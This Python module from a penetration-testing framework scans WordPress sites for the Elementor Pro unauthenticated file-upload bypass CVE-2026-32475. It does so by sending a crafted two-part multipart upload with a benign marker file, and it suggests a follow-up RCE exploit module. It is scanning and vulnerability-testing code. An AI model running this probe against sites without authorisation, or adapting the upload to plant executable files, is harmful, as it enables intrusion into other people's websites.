#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Elementor Pro <= 4.2.1 form file upload bypass (CVE-2026-32475)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "elementor-pro"
_VULN_HIGH = (4, 2, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Elementor Pro CVE-2026-32475 detect",
        "description": (
            "Detects Elementor Pro form with file field; optional dual-part upload probe."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-32475",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-32475"],
        "modules": ["exploits/multi/http/elementor_pro_cve_2026_32475_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "elementor", "file-upload", "cve-2026-32475"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/elementor_pro_cve_2026_32475_upload_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    upload_probe = OptBool(True, "Send elementor_pro_forms_send_form upload", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _scrape_form(self, html: str):
        post_m = re.search(r'name="post_id"\s+value="(\d+)"', html) or re.search(
            r'"post_id"\s*:\s*"?(\d+)"?', html
        )
        form_m = re.search(r'name="form_id"\s+value="([a-f0-9A-F]{4,16})"', html) or re.search(
            r'"form_id"\s*:\s*"([a-f0-9A-F]{4,16})"', html
        )
        file_m = re.search(r'name="form_fields\[([^\]]+)\]"[^>]*type="file"', html) or re.search(
            r'type="file"[^>]*name="form_fields\[([^\]]+)\]"', html
        )
        text_m = re.search(r'name="form_fields\[([^\]]+)\]"[^>]*type="text"', html)
        email_m = re.search(r'name="form_fields\[([^\]]+)\]"[^>]*type="email"', html)
        if post_m and form_m and file_m:
            return post_m.group(1), form_m.group(1), file_m.group(1), text_m.group(1) if text_m else "name", email_m.group(1) if email_m else "email"
        return None

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "elementor-form" not in (home.text or "") or 'type="file"' not in (home.text or ""):
            return False
        scraped = self._scrape_form(home.text or "")
        if not scraped:
            self.set_info(severity="high", reason="Elementor form with file field present", cve="CVE-2026-32475")
            return True
        post_id, form_id, field_id, text_f, email_f = scraped
        if not self.upload_probe:
            return True
        marker = secrets.token_hex(6)
        fname = f"ks{secrets.token_hex(3)}.txt"
        bnd = "WebKitFormBoundarySBDsMGAl"
        parts = [
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nelementor_pro_forms_send_form\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"post_id\"\r\n\r\n{post_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_id\"\r\n\r\n{form_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"queried_id\"\r\n\r\n{post_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"referrer\"\r\n\r\n/\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_fields[{text_f}]\"\r\n\r\nTest\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_fields[{email_f}]\"\r\n\r\ntest@example.com\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_fields[{field_id}][0]\"; filename=\"\"\r\n\r\n\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_fields[{field_id}][1]\"; filename=\"{fname}\"\r\n"
            f"Content-Type: text/plain\r\n\r\nCVE-32475-{marker}\r\n",
            f"--{bnd}--\r\n",
        ]
        up = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": f"multipart/form-data; boundary={bnd}", "X-Requested-With": "XMLHttpRequest"},
            data="".join(parts).encode(),
            allow_redirects=False,
        )
        body = up.text or "" if up else ""
        if up and '"success":true' in body.replace(" ", "") and "not_allowed" not in body:
            self.set_info(
                severity="critical",
                reason="Elementor Pro unauthenticated file upload accepted",
                cve="CVE-2026-32475",
            )
            return True
        return False
